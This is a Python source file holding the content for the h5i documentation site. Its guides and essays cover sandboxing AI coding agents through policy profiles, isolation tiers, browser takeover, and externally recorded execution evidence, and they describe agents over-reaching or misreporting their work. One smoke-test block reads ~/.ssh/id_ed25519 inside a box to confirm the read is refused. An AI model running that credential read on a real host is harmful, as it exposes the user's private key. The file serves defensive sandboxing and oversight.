<ul><li><a href="/manual/#making-a-box">Box source shapes and detached semantics</a>.</li><li><a href="/manual/#h5i-box-export">The output gate and path validation</a>.</li><li><a href="/blog/evidence-for-agent-work/">Why the report and diff answer different questions</a>.</li><li><a href="/guides/watch-the-browser/">How to exercise a web change inside the box</a>.</li></ul>""",
    "faq": [
        ("Do GitHub credentials enter the box?", "No. The host fetches the pull-request head. The detached box receives the code, not the host's SSH key, GitHub token, or inherited origin remote."),
        ("Why not check out the branch in a normal worktree?", "A worktree separates checkouts, not authority. Package scripts would still run with your user's filesystem, network, sockets, and credentials unless another boundary removes them."),
        ("Can an agent perform the review?", "Yes. Run it inside the box and ask it to build, test, inspect the browser, and write findings. The execution record remains separate from the agent's self-report."),
    ],
    "next": ("/guides/write-a-box-policy/", "Next guide", "Write the boundary down", "Turn filesystem, network, and resource assumptions into a checked-in profile."),
    "cta": ("Review behavior, not just text", "Give untrusted code somewhere safe to execute before you decide whether to take it.", "/manual/#h5i-box-export", "Read about export"),
}


POLICY = {
    "section": "guides", "slug": "write-a-box-policy", "eyebrow": "Guide 04 / Policy",
    "time": "10 min", "tags": "Isolation &middot; Egress &middot; Resources",
    "title": "Write an h5i box policy | h5i", "h1": "Write down what the agent may reach",
    "description": "Define an h5i profile with an explicit isolation tier, filesystem grants, default-deny networking, and resource limits, then verify it.",
    "deck": "Permission prompts ask the agent to police itself. A box policy is resolved before the agent starts, enforced outside its process, and digested into every receipt.",
    "body": f"""
<div class="callout"><strong>Start narrow.</strong> Grant the workspace, the system paths required to run, the destinations required for the task, and a finite wall clock. Add authority only after a refusal explains why it is needed.</div>
<figure class="feature-figure"><img src="/_static/box-policy-lifecycle.svg" alt="A checked-in h5i policy resolves into a complete policy file, a SHA-256 digest, and receipts stamped with that digest"><figcaption>Intent is checked into the repository. Enforcement is fully resolved before creation. The digest connects later evidence to the rules that actually ran.</figcaption></figure>
<p>Command-line flags are convenient for experiments and poor as a long-term security policy. They arrive one at a time, disappear from code review, and are easy to vary between developers. A repository profile makes the boundary one object that can be discussed before any agent process exists.</p>
<h2 id="profile">1. Add a named profile</h2>
<p>Create <code>.h5i/env.toml</code> in the repository. This example supports a bounded review that needs the GitHub API:</p>
{terminal('.h5i/env.toml', '''[profile.review]
isolation = "supervised"

[profile.review.fs]
read  = ["/usr", "/etc"]
write = ["$WORK"]

[profile.review.net]
mode   = "deny"
egress = ["api.github.com"]
unix   = false

[profile.review.resources]
mem   = "4G"
procs = 256
wall  = "30m"''')}
<p><code>$WORK</code> is the box workspace, not your current checkout. <code>mode = "deny"</code> makes the allowlist meaningful: everything not named is refused.</p>
<h3>Read every field as authority</h3>
<p>The filesystem block says which existing data enters the box and where writes can land. The network block says whether destinations exist from the box's point of view. The resource block bounds how long a mistaken loop or fork-heavy build can consume the machine. None is application configuration. Each is part of the security claim.</p>
<h2 id="tier">2. Choose the tier by threat model</h2>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Tier</th><th>Use it for</th><th>Boundary to remember</th></tr></thead><tbody>
<tr><th><code>workspace</code></th><td>Checkout separation only</td><td>No confinement</td></tr>
<tr><th><code>process</code></th><td>Fast local build and test</td><td>Shared kernel; network is deny or host</td></tr>
<tr><th><code>supervised</code></th><td>Untrusted dependencies and bounded egress</td><td>Shared kernel; L3/L4 egress enforcement</td></tr>
<tr><th><code>container</code></th><td>Portable image-based environments</td><td>Proxy-respecting L7 egress only</td></tr>
<tr><th><code>microvm</code></th><td>Work that must not share the host kernel</td><td>Needs virtualization, <code>msb</code>, and a pre-pulled image</td></tr>
</tbody></table></div>
<p><code>container</code> buys portability. It does not provide tighter egress enforcement than <code>supervised</code>. Pick the property you need instead of assuming every higher-sounding rung is stronger in every dimension.</p>
<h2 id="verify">3. Prove the requested policy is satisfiable</h2>
{terminal('host', '''$ h5i box probe
$ h5i box create policy-check --profile review
$ h5i box status policy-check
$ h5i box doctor policy-check''')}
<p>An explicit tier either exists or creation fails. h5i does not silently downgrade. The status prints the resolved policy, while <code>doctor</code> checks that the box can still support its claim.</p>
<p>The stored <code>policy.resolved.toml</code> is the version to audit after creation. Variables such as <code>$WORK</code>, platform-specific grants, engine selection, and runtime defaults have been expanded there. Editing <code>.h5i/env.toml</code> later does not retroactively change an existing box; create a new one if the boundary changes.</p>
<h2 id="denials">4. Let denials guide refinement</h2>
{terminal('host', '''$ h5i box run policy-check -- npm test
$ h5i box log policy-check
$ h5i box export policy-check --out ./policy-check-report''')}
<p>A denied registry host may justify one more destination. A denied telemetry host usually does not. Treat each addition as a reviewable transfer of authority, not a way to make the error disappear.</p>
<div class="callout warn"><strong>Do not turn on Unix sockets casually.</strong> <code>unix = true</code> permits <code>AF_UNIX</code> sockets, which can carry file descriptors through <code>SCM_RIGHTS</code>. The browser profile needs this; most build profiles do not.</div>
<h2 id="commit">5. Commit the policy with the code</h2>
<p>A checked-in profile gives reviewers one file to discuss. At creation, h5i resolves machine-specific values, serializes the result, hashes it, and puts that digest on the receipts. The repository states the intended boundary; the receipt names the boundary that actually ran.</p>
<h2 id="network-detail">Understand what the same egress list means at each tier</h2>
<p>The profile may contain the same hostname list while the enforcement changes underneath it. At <code>supervised</code>, h5i resolves and pins addresses, installs nftables rules in a private network namespace, pins DNS through a hosts file, and gates socket creation. A client that ignores proxy variables still meets packet-layer rules.</p>
<p>At <code>container</code>, the list configures an HTTP/HTTPS CONNECT proxy. This covers ordinary package managers, SDKs, and command-line HTTP clients that respect proxy configuration. It does not constrain arbitrary raw connections through rootless NAT. The policy syntax is shared; the reported enforcement layer tells you what the list proves.</p>
<p>At <code>microvm</code>, the guest network stack evaluates destination rules. Enforcement is L3/L4, but denied attempts do not currently produce the same per-host receipt summary. Stronger blocking and richer evidence are independent properties.</p>
<h2 id="auth-detail">Add credentials as grants, not environment inheritance</h2>
<p>If the task needs an authenticated API, do not add the real token to <code>env.pass</code>. Declare an auth grant whose credential is resolved on the host and whose client can be pointed at a base URL. The box receives a per-run dummy; the broker injects the real credential only toward the pinned upstream.</p>
<p>Keep the service token narrow anyway. The broker protects possession and destination. It does not turn repository-wide administration into read-only access.</p>
<h2 id="resources-detail">Resource limits are platform claims too</h2>
<p>Wall-clock limits are enforceable everywhere. Memory and process-count ceilings at the host-kernel tiers are not honestly enforceable on macOS, so h5i marks them rather than pretending. Choose <code>container</code> or <code>microvm</code> if a real ceiling is part of the threat model.</p>
<p>A limit should match the workload with enough headroom for ordinary peaks. A browser build that legitimately needs three gigabytes will teach nobody anything when capped at one. The useful ceiling prevents unbounded behavior without converting normal execution into noise.</p>
<h2 id="lint">Test the failure path, not only the happy path</h2>
<p>After creation, deliberately request one path and one destination that should be denied. Then inspect the log or export. This confirms both enforcement and evidence routing on the current host.</p>
{terminal('inside and outside', '''$ h5i box run policy-check -- sh -c 'cat ~/.ssh/id_ed25519'
# expected: read refused or path absent
$ h5i box run policy-check -- curl https://example.invalid
# expected: destination refused
$ h5i box log policy-check''')}
<p>Do this with harmless targets. The exercise is not a penetration test; it is a smoke test that the written boundary appears in behavior and in the review record.</p>
<h2 id="mistakes">Common policy mistakes</h2>
<ul><li><strong>Granting all of HOME:</strong> this defeats the credential and configuration boundary. Seed only the runtime state the built-in profile needs.</li><li><strong>Using host networking to fix one registry:</strong> add the registry destination or a warm cache instead.</li><li><strong>Enabling Unix sockets by default:</strong> local sockets can carry file descriptors and ambient host authority.</li><li><strong>Choosing container because it sounds stronger:</strong> use it for image portability; choose supervised for packet-layer egress.</li><li><strong>Changing policy without recreating the box:</strong> existing boxes keep the policy digest they started with.</li></ul>
<h2 id="sources">Reference</h2>
<ul><li><a href="/manual/#policy">Complete policy reference and built-in profiles</a>.</li><li><a href="/manual/#credentials">Credential and secret grants</a>.</li><li><a href="/blog/choosing-agent-isolation/">The threat model behind the tier choice</a>.</li><li><a href="https://github.com/h5i-dev/h5i/blob/main/docs/design/design-credential-proxy.md">Credential proxy design and open limits</a>.</li></ul>""",
    "faq": [
        ("What happens if my machine cannot provide the requested tier?", "Creation fails before a partial box is left behind. Explicit isolation requests are never silently downgraded."),
        ("Why is container egress weaker than supervised egress?", "The container tier uses an HTTP/HTTPS proxy allowlist, so software that ignores proxy settings can bypass that L7 route. The supervised tier enforces destination access in a private network namespace at L3/L4."),
        ("Are memory and process limits enforced on macOS?", "Not at the process and supervised tiers. h5i marks those values instead of claiming enforcement. Use container or microvm when a hard memory or process ceiling is required."),
    ],
    "next": ("/blog/choosing-agent-isolation/", "Choose a sandbox", "How to choose an AI agent sandbox", "Select process, supervised, container, or microVM isolation by the failure it must prevent."),
    "cta": ("Make authority reviewable", "A small policy file is easier to reason about than a trail of permission clicks.", "/manual/#policy", "Open the policy reference"),
}


BROWSER = {
    "section": "guides", "slug": "watch-the-browser", "eyebrow": "Guide 05 / Takeover",
    "time": "9 min", "tags": "Dev server &middot; Viewer &middot; Control lock",
    "title": "Watch an agent's browser in an h5i box | h5i",
    "h1": "Watch the page, then take the controls",
    "description": "Run a dev server and browser inside an h5i box, watch it through a loopback-only viewer, and safely transfer control from agent to human.",
    "deck": "The browser belongs inside the same boundary as the code and dev server. You still need a way to see it—and a handoff that cannot turn a stale page reference into the wrong click.",
    "body": f"""
<div class="callout"><strong>The shape.</strong> Frames flow out of the box. Input flows in only for the control-lock holder. The browser's stream port is never published on the host.</div>
<figure class="feature-figure"><img src="/_static/browser-in-terminal.svg" alt="h5i enters a box network namespace, receives browser frames without binding a port, and renders them through the Kitty graphics protocol"><figcaption>The terminal path binds nothing. h5i holds the socket itself, decodes bounded image frames, and generates every terminal escape byte on the host side.</figcaption></figure>
<p>The browser is not a cosmetic add-on to a coding session. It executes page code, stores session state, reaches loopback, and turns visual behavior into instructions the agent can act on. Keeping it inside the box is what makes “open localhost” mean the disposable application rather than the developer's machine.</p>
<h2 id="create">1. Create a browser box</h2>
{terminal('host', '''$ h5i box create browser-demo --from HEAD --profile browser
$ h5i box shell browser-demo''')}
<p>The <code>browser</code> profile adds a fresh browser profile, the control daemon, and the socket access that daemon requires. Browser state is scoped to this box.</p>
<h2 id="serve">2. Start the app and browser in the same session</h2>
{terminal('inside the box', '''box$ npm run dev &
box$ agent-browser stream enable
box$ agent-browser open http://localhost:3000
box$ agent-browser snapshot''')}
<p>Keep the shell alive. At the isolated network tiers, the network namespace belongs to that session. The browser reaches the dev server on the box's own loopback.</p>
<h2 id="view">3. Open a host-side viewer</h2>
{terminal('second host terminal', '''$ h5i box view browser-demo
# Or, in a Kitty-graphics terminal:
$ h5i box view browser-demo --term''')}
<p>The browser viewer binds host loopback and uses a per-box token that the box cannot read. The terminal viewer binds nothing: it enters the box's network namespace, receives compressed pixels, and emits its own terminal escapes.</p>
<p>That last detail closes a less obvious direction. Terminal output is active: escape sequences can manipulate the window, clipboard, and graphics state. The box never writes raw escapes to your terminal. It supplies bounded compressed pixels over the stream; the trusted host viewer creates the Kitty graphics commands.</p>
<h2 id="take">4. Take control explicitly</h2>
{terminal('host', '''$ h5i browser status browser-demo
$ h5i browser take browser-demo
# interact in the viewer
$ h5i browser release browser-demo''')}
<p>Taking control invalidates every page handle the agent held. When control returns, the agent must take a new snapshot before it can act. A stale handle is refused instead of being resolved against a page that may have changed under human hands.</p>
<h2 id="review">5. Review browser evidence with the code</h2>
{terminal('host', '''$ h5i box export browser-demo --out ./browser-review
$ less ./browser-review/report.md''')}
<p>The report can include console errors, uncaught exceptions, failed requests, and viewer sessions. It can show that a human took over; it cannot claim the page was correct merely because someone viewed it.</p>
<h2 id="status-row">Read the status row before the page</h2>
<p>In terminal mode, row one belongs to h5i. The page cannot draw over it. It shows the box name, watch or drive mode, current control holder, page origin, egress posture, and error count. The origin is particularly important: a convincing login page and the application under test can render the same pixels.</p>
<p>Watch mode leaves the terminal's mouse alone so selection and scrollback continue to work. Drive mode enables mouse reporting and sends input to the box while you hold the lock. The distinction is visible because silently stealing terminal input would make observation itself unsafe.</p>
<h2 id="lock-detail">The lock is enforced at the browser choke point</h2>
<p>When the human holds control, mutating agent verbs are refused at the daemon's control socket. This is stronger than an instruction telling the agent to wait: the action does not reach the browser. The refusal is recorded.</p>
<p>The scope is still worth naming. The daemon lives inside the box, and there is no privilege boundary between it and a process determined to bypass the documented path. The lock coordinates a supported agent client; the outer box policy remains the security boundary.</p>
<h2 id="fresh-profile">Why the profile must be fresh</h2>
<p>Pointing automation at a daily browser imports every live session, extension permission, saved credential, and browsing artifact. Copying that profile only creates a second credential archive. Headless mode changes rendering, not authority.</p>
<p>The browser profile creates state inside the box. It has never been logged into your cloud console or email. Its downloads land in the disposable filesystem. Its loopback contains the app under test. Its external network is the box's network policy. Those properties do more security work than a long list of “safe” browser verbs.</p>
<h2 id="evidence-detail">Collect page evidence independently</h2>
<p>An agent can report “the page loaded correctly” after looking at a screenshot. h5i separately drains console errors, uncaught exceptions, and failed requests on its own timing. If no browser is available, the record should say unavailable instead of rendering an empty list that looks clean.</p>
<p>Use browser evidence to ask better questions. A failed request can explain an empty component. A console exception can identify a code path the screenshot hid. A viewer session tells the reviewer when human action may have changed state the agent later observed.</p>
<h2 id="terminal-limits">Terminal-viewer limits</h2>
<ul><li>A terminal reports key presses, not reliable key releases, so held-key gestures do not work.</li><li>Clicks land at terminal-cell resolution after scaling, which is less precise than a native browser surface.</li><li>The terminal needs Kitty graphics support. If it lacks that protocol, use the loopback browser viewer.</li><li>A viewer proves what frames and input crossed the bridge, not that the application behaved correctly.</li></ul>
<h2 id="troubleshoot">If no frames arrive</h2>
<p>Keep the box session running, confirm <code>agent-browser stream enable</code> succeeded, and check <code>h5i browser status browser-demo</code>. At isolated tiers the viewer finds the namespace through the live session's process, so an exited shell leaves no namespace to enter. If the dev server is missing, inspect it inside the same shell instead of publishing a replacement on the host.</p>
<h2 id="sources">Reference</h2>
<ul><li><a href="/manual/#h5i-box-view">Browser and terminal viewer reference</a>.</li><li><a href="/manual/#h5i-browser">Browser session and control-lock commands</a>.</li><li><a href="/blog/prompt-injection-is-a-boundary-problem/">Why browser authority changes the injection threat model</a>.</li><li><a href="https://github.com/h5i-dev/h5i/tree/main/crates/h5i-browser">The local browser implementation</a>.</li></ul>""",
    "faq": [
        ("Does h5i publish the box's browser port?", "No. h5i enters the box's network namespace by process id, connects from inside, and hands the socket back out through a loopback-only authenticated viewer."),
        ("Why do page references become stale after a handoff?", "A human can change navigation, focus, and DOM state. Invalidating old handles forces the agent to observe the new page before acting, preventing a stale reference from targeting the wrong element."),
        ("Can I watch over SSH?", "Yes, with h5i box view --term in a terminal that supports the Kitty graphics protocol. This path does not bind a port."),
    ],
    "next": ("/blog/the-environment-is-the-sandbox/", "Why sandbox it", "Why sandbox the entire AI agent workload", "Dependencies, tools, tests, servers, and browsers all execute during a coding task."),
    "cta": ("Put localhost inside the boundary", "Let the agent exercise the same application you are watching without publishing its internal ports.", "/manual/#h5i-box-view", "Open the viewer reference"),
}


ENVIRONMENT = {
    "section": "blog", "slug": "the-environment-is-the-sandbox",
    "eyebrow": "Essay / Motivation", "time": "6 min", "tags": "Coding agents &middot; Sandbox &middot; Supply chain",
    "title": "Why sandbox the entire AI agent workload | h5i", "h1": "Why sandbox the entire AI agent workload",
    "description": "AI coding agents run package scripts, compilers, tests, servers, and browsers. Sandboxing the whole workload limits what mistakes and untrusted code can reach.",
    "deck": "A coding agent runs far more than its own executable. Dependencies, build tools, tests, servers, and web pages all execute during the task. They need one shared boundary.",
    "body": """
<div class="callout"><strong>The claim.</strong> Sandbox the workload, not only the agent executable. Every process and browser session used for the task should inherit the same limits on files, credentials, network access, and output.</div>
<h2 id="risk">A coding task executes untrusted code</h2>
<p>Ask an agent to update one dependency. It runs a package manager, which downloads other packages and may execute their install scripts. The build may load compiler plugins. Tests run project code. A dev server runs bundler plugins. A browser executes JavaScript returned by the application or by an external page.</p>
<p>The agent did not write most of that code, and neither did you. Even a correct agent can trigger a compromised dependency, a malicious repository hook, or a test fixture that was never safe to run on a developer machine.</p>
<p>The final Git diff does not show a script reading <code>~/.ssh</code>, probing a local service, or sending an environment variable to the network. Reviewing the patch is necessary, but it cannot reconstruct everything that executed while producing the patch.</p>
<h2 id="command">One sandboxed command is not enough</h2>
<p>A command wrapper protects only commands that use it. An agent may invoke hundreds of tools during one task, and those tools start their own children:</p>
<div class="terminal"><div class="terminal-bar"><span class="terminal-path">one task, many processes</span></div><div class="terminal-body"><pre><code>agent
  ├─ package manager ─ install scripts
  ├─ compiler ─ linker ─ build helpers
  ├─ test runner ─ workers ─ project code
  ├─ dev server ─ bundler ─ plugins
  └─ browser ─ page JavaScript</code></pre></div></div>
<p>If safety depends on the agent remembering to prefix every command, one missed prefix removes the protection. Confinement must follow the process tree automatically.</p>
<p>A separate Git worktree is also insufficient. It protects the parent checkout from ordinary edits, but it does not restrict reads from the home directory, access to credentials and Unix sockets, outbound connections, or use of a logged-in browser profile.</p>
<h2 id="boundary">The sandbox should cover the complete workload</h2>
<p>For a coding task, the boundary should contain:</p>
<ul><li>the disposable checkout;</li><li>the agent and its shell;</li><li>package managers, build tools, hooks, and tests;</li><li>the dev server and its loopback network;</li><li>a fresh browser profile when the task uses a browser.</li></ul>
<p>These components do not need identical permissions. They need to remain inside one outer boundary. A package script should not escape because it was started by npm instead of the agent. A browser opening <code>localhost</code> should reach the disposable dev server, not services on the host. Downloads should land in the disposable filesystem, not the user's home directory.</p>
<p>In h5i, <code>box shell</code> and <code>box run</code> start the process tree inside a resolved policy. Their children inherit the boundary. A host-side <code>browser open --in &lt;box&gt;</code> places the browser in that same box.</p>
<h2 id="outside">Keep authority and approval outside</h2>
<p>Not everything belongs inside. The policy must be resolved where the workload cannot rewrite it. Long-lived credentials should stay on the host and be injected only into approved requests. Execution evidence should be stored outside the box's writable paths.</p>
<p>The agent also should not approve its own output. The box may propose a patch, but a human reviews the diff and execution record before exporting or applying it to the parent repository.</p>
<p>This creates a useful asymmetry: the agent can work freely within the task boundary, while the path back to valuable state remains narrow and explicit.</p>
<h2 id="limits">Sandboxing limits damage; it does not prove correctness</h2>
<p>A sandbox does not make generated code correct. An agent can write a vulnerability, run the wrong tests, or misunderstand the task without escaping any boundary. Human review and appropriate tests remain necessary.</p>
<p>The strength of the boundary also depends on the isolation mechanism. A worktree provides no process confinement. Host-kernel tiers still trust the host kernel. A microVM adds a separate guest kernel at greater cost. Network enforcement differs by tier, so the status of the actual run matters more than the word sandbox.</p>
<p>Finally, an allowed model request may contain source code. Local confinement cannot keep source private from a model endpoint that policy permits. Use a self-hosted model or disable model egress when source must not leave.</p>
<h2 id="test">A practical test</h2>
<p>Before trusting an agent sandbox, ask:</p>
<ol><li>Do package scripts, compiler helpers, tests, and servers inherit the boundary?</li><li>Which home directory, credentials, sockets, and network destinations can they reach?</li><li>Does browser work use a fresh profile inside the same boundary?</li><li>Is execution recorded somewhere the workload cannot edit?</li><li>Can the agent modify the parent repository without human approval?</li></ol>
<p>If the answers describe several unrelated boundaries, part of the workload is probably still running with ambient host authority.</p>
<h2 id="sources">Sources and further reading</h2>
<ul><li><a href="/blog/the-h5i-loop/">Sandbox the entire workflow</a>, for the browser-to-patch workflow.</li><li><a href="/manual/#isolation-tiers">Isolation tiers</a>, for the enforcement and limits of each boundary.</li><li><a href="/guides/first-box/">The first-box guide</a>, for running one coding task in a box.</li></ul>""",
    "faq": [
        ("Is a Git worktree an agent sandbox?", "No. A worktree separates checkouts and branches. It does not constrain the process tree, filesystem reads, credentials, sockets, network destinations, or browser state."),
        ("Why does the browser need to be inside?", "The browser executes untrusted page code and holds session state. Keeping it beside the dev server gives both the same isolated localhost while preventing the agent from inheriting a user's normal browser profile."),
    ],
    "next": ("/blog/choosing-agent-isolation/", "Choose a mechanism", "How to choose an AI agent sandbox", "Select a tier by the failure it must prevent."),
    "cta": ("Try the whole loop once", "Create a box, do one real task, and review the patch beside the execution record.", "/guides/first-box/", "Follow the first-box guide"),
}


TIERS = {
    "section": "blog", "slug": "choosing-agent-isolation", "eyebrow": "Essay / Selection guide",
    "time": "6 min", "tags": "Process &middot; Network &middot; Container &middot; MicroVM",
    "title": "How to choose an AI agent sandbox | h5i", "h1": "How to choose an AI agent sandbox",
    "description": "Choose an AI coding-agent sandbox by the failure it must prevent: host file access, unrestricted network traffic, environment drift, or a shared kernel.",
    "deck": "Start with the failure you need to prevent. Use process isolation for host files, supervised isolation for raw network egress, containers for a fixed image, or a microVM for a separate kernel.",
    "body": """
<div class="callout"><strong>Choose by the required protection.</strong> Use <code>process</code> to restrict files and syscalls, <code>supervised</code> to block off-list network destinations at L3/L4, <code>container</code> to run a fixed image, and <code>microvm</code> to avoid sharing the host kernel. <code>workspace</code> only separates the checkout.</div>
<h2 id="decision">Start with the failure you must prevent</h2>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Requirement</th><th>Choose</th><th>Main limitation</th></tr></thead><tbody>
<tr><td>Keep edits out of the developer's checkout</td><td><code>workspace</code></td><td>No process confinement</td></tr>
<tr><td>Restrict filesystem access and dangerous syscalls</td><td><code>process</code></td><td>Shares the host kernel; no L3/L4 destination allowlist</td></tr>
<tr><td>Block raw connections to unapproved destinations</td><td><code>supervised</code></td><td>Shares the host kernel; cannot hold resident services today</td></tr>
<tr><td>Use the same filesystem image across machines</td><td><code>container</code></td><td>Egress allowlist only covers proxy-respecting traffic</td></tr>
<tr><td>Run without sharing the host kernel</td><td><code>microvm</code></td><td>Needs hardware virtualization and a prepared image</td></tr>
</tbody></table></div>
<p>Do not choose from the tier name alone. Decide which failure is unacceptable, then select the first tier that prevents it.</p>
<h2 id="workspace">Workspace separates Git state; it does not sandbox code</h2>
<p><code>workspace</code> gives the agent a separate worktree, branch, index, and pinned base. It prevents ordinary checkout collisions and makes the final diff easy to review.</p>
<p>The process still runs as the host user. It can reach the user's files, credentials, sockets, and network. Use this tier only when checkout separation is the entire requirement.</p>
<h2 id="process">Process restricts ordinary coding workloads</h2>
<p><code>process</code> confines the agent and its descendants with filesystem allowlists, syscall restrictions, namespaces, and supported resource limits. On Linux, h5i uses Landlock and seccomp. Package scripts, compiler helpers, and test workers inherit the same restrictions.</p>
<p>This is the practical choice for routine agent work when the main risks are unwanted file access, dangerous syscalls, or runaway subprocesses. It still shares the host kernel. Its network policy is coarse: deny networking or use the host network.</p>
<h2 id="supervised">Supervised blocks raw off-list network traffic</h2>
<p><code>supervised</code> adds a private network namespace, pinned DNS results, nftables rules, and a gate on socket creation. A process cannot bypass the allowlist by clearing proxy variables and opening a raw connection.</p>
<p>Choose it when destination control matters more than long-lived services. The tier currently cannot keep a resident browser or dev server alive after the supervising command exits, and it still shares the host kernel.</p>
<h2 id="container">Container provides a fixed toolchain image</h2>
<p><code>container</code> runs a prepared OCI image with rootless Podman, dropped capabilities, a read-only root filesystem, and only the intended mounts. It is useful when developers and CI must use the same operating-system packages and toolchain.</p>
<p>Its destination allowlist uses an HTTP/HTTPS proxy. Package managers and HTTP clients that respect the proxy are constrained; a program that opens a raw socket can bypass that route. Choose this tier for image portability, not packet-level egress enforcement.</p>
<h2 id="microvm">MicroVM provides a separate guest kernel</h2>
<p><code>microvm</code> runs the workload behind a guest kernel and hypervisor. Choose it for hostile native code or any task where a shared host kernel is outside the risk budget.</p>
<p>It requires compatible hardware virtualization, a working microVM runtime, and a prepared image. Startup is heavier, some host credential routes are unavailable, and denied-network evidence is less detailed than proxy logs. On Linux today, it is also the tier that can keep a resident browser while enforcing network destinations outside that browser.</p>
<h2 id="verify">Verify the selected tier on the actual host</h2>
<p>Operating-system features may exist but be unusable because of kernel configuration, permissions, or another security policy. h5i therefore probes functionality and refuses an explicit tier instead of silently downgrading it.</p>
<div class="terminal"><div class="terminal-bar"><span class="terminal-path">verify before work</span></div><div class="terminal-body"><pre><code>$ h5i box probe
$ h5i box create review-1234 --profile agent-claude --isolation supervised
$ h5i box status review-1234</code></pre></div></div>
<p><code>probe</code> reports what the host can run. <code>status</code> reports what this box actually received. Check both when filesystem, network, resource, or kernel isolation affects the decision.</p>
<h2 id="platform">Platform limits still apply</h2>
<p>Linux and macOS do not provide identical enforcement. Linux supplies Landlock, seccomp, network namespaces, nftables, and cgroups. macOS uses Seatbelt and lacks equivalents for some network and resource controls. h5i reports unsupported controls instead of presenting them as active.</p>
<h2 id="sources">Sources and further reading</h2>
<ul><li><a href="/manual/#isolation-tiers">The isolation-tier reference</a>, including platform-specific limits.</li><li><a href="/guides/write-a-box-policy/">Write a box policy</a>, for storing the chosen controls in the repository.</li><li><a href="/blog/the-environment-is-the-sandbox/">Why sandbox the entire AI agent workload</a>, for the motivation behind using one boundary.</li></ul>""",
    "faq": [
        ("Should I use microVM for every agent task?", "No. Use it when the workload must not share the host kernel. Process isolation is lighter for routine coding, supervised provides packet-level destination control, and container provides a fixed toolchain image."),
        ("Does container isolation block every off-list connection?", "No. Its HTTP and HTTPS proxy constrains software that uses the proxy. Use supervised or microvm when raw off-list connections must fail at the network boundary."),
    ],
    "next": ("/guides/write-a-box-policy/", "Put it into practice", "Write a box policy", "Turn the threat model into a profile the repository can review."),
    "cta": ("Ask the host what it can enforce", "Run the functional probe before choosing a tier by name.", "/manual/#isolation-tiers", "Compare the tiers"),
}


EVIDENCE = {
    "section": "blog", "slug": "evidence-for-agent-work", "eyebrow": "Essay / Code review",
    "time": "6 min", "tags": "Code review &middot; Execution records &middot; Receipts",
    "title": "Review AI-generated code with execution evidence | h5i", "h1": "Review AI-generated code with execution evidence",
    "description": "Review AI-generated code using the diff, externally observed test results, denied actions, browser errors, and explicit gaps in evidence.",
    "deck": "A diff shows what changed. It does not show which tests ran, what failed, or what the agent tried to access. Review the code together with execution records collected outside the agent.",
    "body": """
<div class="callout"><strong>The rule.</strong> Use the agent's summary to understand its intent. Use records collected outside the agent to verify what ran and what the sandbox allowed or refused.</div>
<h2 id="gap">A diff does not record execution</h2>
<p>Suppose an agent changes authentication code and reports: “Added token refresh, wrote regression tests, and all tests pass.” The diff can confirm the code and test files. It cannot confirm that the full suite ran or passed.</p>
<p>A diff also cannot show an install script reading outside the workspace, a command killed by a resource limit, a refused network destination, or a browser error. These events may leave no file change.</p>
<p>Code review therefore needs two kinds of information: repository state and execution records.</p>
<h2 id="records">Use each record for the question it can answer</h2>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Record</th><th>Answers</th><th>Does not prove</th></tr></thead><tbody>
<tr><td>Diff against the pinned base</td><td>What files changed</td><td>Which commands ran</td></tr>
<tr><td>Host-observed process exit</td><td>Which launched command ended, and how</td><td>Every command typed inside an interactive shell</td></tr>
<tr><td>Boundary refusal</td><td>Which file, socket, destination, or limit was denied</td><td>Why the workload attempted it</td></tr>
<tr><td>Box-claimed browser or shell event</td><td>What the instrumented component reported</td><td>That the component reported everything honestly</td></tr>
<tr><td>Agent summary</td><td>What the agent intended and believes it completed</td><td>That its claims are correct</td></tr>
</tbody></table></div>
<p>Do not merge these sources into one unlabeled log. <code>host-observed</code> means h5i recorded an event from outside the box. <code>box-claimed</code> means a component inside the box reported it. Both can be useful, but they support different conclusions.</p>
<h2 id="storage">Store evidence outside the workload's write access</h2>
<p>An external observation loses its value if the agent can edit it afterwards. h5i stores ingested receipts outside every filesystem path granted to the box. The workload can submit detailed records, but it cannot rewrite host-observed exits or earlier ingested history without escaping the sandbox.</p>
<p>This is protection from the box, not from the host owner. A person who controls the machine can alter local files. h5i receipts are not third-party signatures, timestamps, or notarized audit records.</p>
<h2 id="denials">Keep failures and refused actions</h2>
<p>Retaining only the final successful test run removes useful context. An earlier failure may show what the agent fixed—or that it weakened an assertion until the test passed.</p>
<p>Refused actions also matter. A request to a telemetry host may be harmless, while an attempt to read a credential directory may require investigation. The record should state what was refused without assigning intent.</p>
<h2 id="missing">Report missing evidence explicitly</h2>
<p>An empty browser-error list can mean that no errors occurred, no browser ran, or browser collection failed. An empty network section can mean no connections were refused or that the selected isolation tier does not report them.</p>
<p>Use distinct states such as <code>empty</code> and <code>unavailable</code>. Missing observation must not appear as a successful result.</p>
<h2 id="review">Review in this order</h2>
<ol><li>Check the resolved policy and isolation tier.</li><li>Read refused actions, failed commands, and resource-limit events.</li><li>Confirm that the required build and test commands have observed results.</li><li>Read browser errors and other box-claimed records, including unavailable sections.</li><li>Review the diff against its pinned base.</li><li>Compare the agent's summary with the records above.</li></ol>
<p>This order prevents a confident summary from becoming the evidence against which everything else is interpreted.</p>
<h2 id="export">What h5i exports</h2>
<div class="terminal"><div class="terminal-bar"><span class="terminal-path">review bundle</span></div><div class="terminal-body"><pre><code>review/
├── patch.diff      # file changes against the pinned base
├── report.md       # execution and browser records for review
└── receipt.json    # events, observer labels, policy digest</code></pre></div></div>
<p>The bundle does not approve the patch. It gives the reviewer the code change, the policy applied to the run, and the available execution records in one place.</p>
<h2 id="sources">Sources and further reading</h2>
<ul><li><a href="/manual/#receipts">Receipt fields and observer labels</a>.</li><li><a href="/manual/#h5i-box-export">Export bundle contents and limits</a>.</li><li><a href="/guides/review-a-pull-request/">Review a pull request by running it in a detached box</a>.</li></ul>""",
    "faq": [
        ("Is an h5i receipt tamper-proof?", "It is protected from the box, not from a user who controls the host. h5i stores ingested receipts outside every filesystem grant held by the box; it does not provide third-party notarization."),
        ("Why keep agent-reported records at all?", "They provide useful detail that an external observer may not have. The requirement is to label their source and compare them with host-observed events, not to discard testimony."),
    ],
    "next": ("/guides/review-a-pull-request/", "Use the method", "Review a pull request by running it", "Read the report in an evidence-first order."),
    "cta": ("Put the record beside the patch", "Export both, then review each artifact for the question it can actually answer.", "/manual/#receipts", "Read the receipt reference"),
}


INJECTION = {
    "section": "blog", "slug": "prompt-injection-is-a-boundary-problem",
    "eyebrow": "Essay / Security", "time": "6 min", "tags": "Prompt injection &middot; Sandboxing &middot; Least authority",
